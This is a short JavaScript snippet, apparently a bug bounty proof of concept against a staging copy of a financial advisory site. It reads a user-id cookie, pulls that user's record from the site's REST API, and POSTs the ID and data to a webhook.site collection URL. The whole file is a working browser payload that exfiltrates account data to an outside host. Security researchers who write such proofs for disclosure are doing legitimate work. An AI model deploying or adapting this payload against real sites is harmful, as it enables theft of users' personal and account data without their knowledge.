function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}
const userId = getCookie('user-id');

if (userId) {
    fetch(`https://advisor-stgclone12.pontera.com/Hackerone1/rest/api/users/${userId}`)
        .then(response => response.json())
        .then(data => {
            // Send the data to your server
            fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    userId: userId,
                    userData: data
                })
            })
            .then(response => console.log('Data sent successfully'))
            .catch(error => console.error('Error sending data:', error));
        })
        .catch(error => console.error('Error fetching user data:', error));
} else {
    console.error('user-id cookie not found');
}